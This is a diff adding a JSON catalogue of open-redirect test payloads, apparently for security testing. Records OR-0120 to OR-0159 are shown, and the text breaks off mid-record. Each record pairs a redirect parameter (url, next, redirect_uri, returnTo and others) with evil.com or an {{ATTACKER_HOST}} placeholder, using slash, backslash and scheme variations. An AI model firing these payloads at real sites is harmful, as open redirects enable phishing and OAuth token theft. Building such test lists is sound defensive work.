@@ -1,0 +1,1991 @@
+{
+  "name": "request_context_templates",
+  "record_type": "request_context_template",
+  "count": 80,
+  "note": "Classification only; records remain untested unless explicitly documented otherwise.",
+  "records": [
+    {
+      "id": "OR-0120",
+      "payload": "/redirect?url=//evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=//{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=//{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0121",
+      "payload": "/redirect?url=https://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=https://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=https://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0122",
+      "payload": "/redirect?url=http://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=http://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=http://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0123",
+      "payload": "/redirect?url=//evil.com/",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=//{{ATTACKER_HOST}}/",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=//{{ATTACKER_HOST}}/",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0124",
+      "payload": "/redirect?url=https://evil.com/",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=https://{{ATTACKER_HOST}}/",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=https://{{ATTACKER_HOST}}/",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0125",
+      "payload": "/redirect?url=http://evil.com/",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=http://{{ATTACKER_HOST}}/",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=http://{{ATTACKER_HOST}}/",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0126",
+      "payload": "/redirect?url=///evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=///{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=///{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0127",
+      "payload": "/redirect?url=////evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=////{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=////{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0128",
+      "payload": "/redirect?url=/\\/evil.com",
+      "families": [
+        "backslash_and_slash_confusion",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=/\\/{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=/\\/{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0129",
+      "payload": "/redirect?url=\\/evil.com",
+      "families": [
+        "backslash_and_slash_confusion",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=\\/{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=\\/{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0130",
+      "payload": "/redirect?url=\\evil.com",
+      "families": [
+        "backslash_and_slash_confusion",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=\\{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=\\{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0131",
+      "payload": "?url=//evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?url=//{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?url=//{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0132",
+      "payload": "?url=https://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?url=https://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?url=https://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0133",
+      "payload": "?url=http://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?url=http://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?url=http://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0134",
+      "payload": "?redirect=//evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?redirect=//{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?redirect=//{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0135",
+      "payload": "?redirect=https://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?redirect=https://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?redirect=https://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0136",
+      "payload": "?redirect=http://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?redirect=http://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?redirect=http://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0137",
+      "payload": "?next=//evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?next=//{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?next=//{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0138",
+      "payload": "?next=https://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?next=https://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?next=https://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0139",
+      "payload": "?next=http://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?next=http://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?next=http://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0140",
+      "payload": "?rurl=//evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?rurl=//{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?rurl=//{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0141",
+      "payload": "?rurl=https://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?rurl=https://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?rurl=https://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0142",
+      "payload": "?rurl=http://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?rurl=http://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?rurl=http://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0143",
+      "payload": "?dest=//evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?dest=//{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?dest=//{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0144",
+      "payload": "?dest=https://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?dest=https://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?dest=https://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0145",
+      "payload": "?dest=http://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?dest=http://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?dest=http://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0146",
+      "payload": "?destination=//evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?destination=//{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?destination=//{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0147",
+      "payload": "?destination=https://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?destination=https://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?destination=https://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0148",
+      "payload": "?destination=http://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?destination=http://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?destination=http://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0149",
+      "payload": "?redir=//evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?redir=//{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?redir=//{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0150",
+      "payload": "?redir=https://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?redir=https://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?redir=https://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0151",
+      "payload": "?redir=http://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?redir=http://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?redir=http://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0152",
+      "payload": "?redirect_uri=//evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?redirect_uri=//{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?redirect_uri=//{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0153",
+      "payload": "?redirect_uri=https://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?redirect_uri=https://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?redirect_uri=https://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0154",
+      "payload": "?redirect_uri=http://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?redirect_uri=http://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?redirect_uri=http://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0155",
+      "payload": "?return=//evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?return=//{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?return=//{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0156",
+      "payload": "?return=https://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?return=https://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?return=https://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0157",
+      "payload": "?return=http://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?return=http://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?return=http://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0158",
+      "payload": "?returnTo=//evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?returnTo=//{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?returnTo=//{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0159",
+      "payload": "?returnTo=https://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?returnTo=https://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
